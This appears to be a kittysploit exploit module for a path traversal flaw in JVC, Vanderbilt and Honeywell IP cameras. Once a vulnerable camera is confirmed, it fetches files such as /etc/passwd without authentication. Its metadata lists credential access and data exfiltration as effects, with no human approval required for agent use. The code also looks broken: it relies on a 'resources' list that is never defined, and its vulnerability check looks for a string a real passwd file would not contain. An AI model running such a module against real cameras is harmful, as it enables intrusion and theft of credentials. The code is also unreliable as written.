#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JVC & Vanderbilt & Honeywell IP-Camera Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'JVC & Vanderbilt & Honeywell IP-Camera Path Traversal',
        'description': 'Module exploits JVC IP-Camera VN-T216VPRU, Vanderbilt IP-Camera CCPW3025-IR / CVMW3025-IR and Honeywell IP-Camera HICC-1100PT Path Traversal vulnerability. If target is vulnerable it is possible to read file from the filesystem.',
        'author': ['Yakir Wizman', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/40281/'],
        'tags': ['iot', 'camera', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/passwd", "File to read from the filesystem")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable.")

            path = self.valid_resource.format(self.filename)

            response = self.http_request(
                method="GET",
                path=path,
            )

            if response is None:
                print_error("Error with reading response")
                return

            if response.text:
                print_status("Reading file: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - empty response")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        filename = "/etc/passwd"
        for resource in self.resources:
            path = resource.format(filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response and ("/etc/passwd" in (response.text or '')):
                self.valid_resource = resource
                return True  # target is vulnerable

        return False  # target is not vulnerable
